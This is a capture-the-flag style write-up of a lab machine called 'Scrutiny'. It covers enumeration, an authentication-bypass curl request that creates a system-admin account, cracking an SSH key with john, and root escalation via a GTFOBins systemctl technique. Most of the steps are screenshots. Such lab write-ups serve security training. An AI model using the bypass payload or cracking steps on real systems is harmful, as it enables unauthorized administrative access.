---
description: Community Rating:Very hard
---

# Scrutiny

So i start off by enumerating open ports:

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

On the website on port 80 i go to the login page:

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The website does not work and i need to put the webiste in my etc/hosts file as well as the vhost:

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

then i look up at the version number for any known exploits:

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and what stood out even more was a HackTheBox article:

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i tried exploiting this one, i rarely get HTB articles for a specific box so i gave it a go:

```
curl -s -X POST 'http://teams.onlyrands.com/idontexist?jsp=/app/rest/users;.jsp' -H "Content-Type: application/json" --data '{"username": "felix", "password": "felix", "email": "felix", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
```

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I am able to create a new admin user with ease and login:

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

While looking at Queue, i look at the different stuff the freelances pushed to the instance and saw something funny:

<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

maybe i can use this to log in to the instance but it prompted my for a password so i tried ssh2john:

<figure><img src="../../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
john sshhash --wordlist=/usr/share/wordlists/rockyou.txt
```

This revealed the password and made us able to login:

<figure><img src="../../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then we end up in a huge workspace with plenty of users and groups...

To find local.txt i have the following command:

```
find . -name local.txt
```

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

Now i enumerated for a bit and remembered that there was a SMTP server, Traditionally, mail is stored in a "mail spool," a mailbox in the /var/spool/mail directory, where users are expected to retrieve it and indeed there is some nice stuff there:

<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Ok so i was pretty lucky here, i ALWAYS ls -al in the directories of users since i already created forensics challenges where there was hidden files so i was pretty lucky to find this one without too much work:

<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

So now i can switch user and see the rights of this guy:

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

so i go and look at the exploit bible:

{% embed url="https://gtfobins.github.io/gtfobins/systemctl/" %}

and this exploit was the one i already used so i went with it once again:

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

and now we can simply use the GTFObins exploit:

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
